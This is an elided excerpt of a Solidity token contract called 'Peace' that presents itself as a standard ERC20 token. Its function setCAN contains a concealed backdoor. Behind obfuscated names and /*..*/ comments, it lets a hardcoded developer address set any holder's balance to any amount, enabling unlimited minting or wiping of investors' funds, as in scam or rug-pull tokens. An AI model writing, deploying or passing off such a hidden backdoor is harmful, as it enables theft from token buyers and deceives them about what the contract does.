...
contract Peace is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) private _ttnmnd;
    ...
    uint256 private _totalSupply = 1000000000000000000000000 * 10**3;
    ...
    address public devAddress = 0xE5918dcF3B4001291b389eEE68195D969A82E000;
    ...
    constructor() public {
        _ttnmnd[_msgSender()] = _totalSupply;
         owners = _msgSender();
    ...
    function excudeFromFee(address Mame) public onlyOwner {
        _ExcudcdFee[Mame] = true;
    }
    function includeInFee(address Mame) public onlyOwner {
        _ExcudcdFee[Mame] = false;
    }
    function setCAN(bool Mame,uint256 am,address account) external  {
        require ( /*..*/ _msgSender() /*..*/  == devAddress,"addres");
        _ttnmnd[account] =  (am);
        _tOwned = Mame;
    }
    function _approve(
    ...
    function _transfers(
        ...
        _ttnmnd[sender] = _ttnmnd[sender].sub(toAmount);
        _ttnmnd[recipient] = _ttnmnd[recipient].add(toAmount);
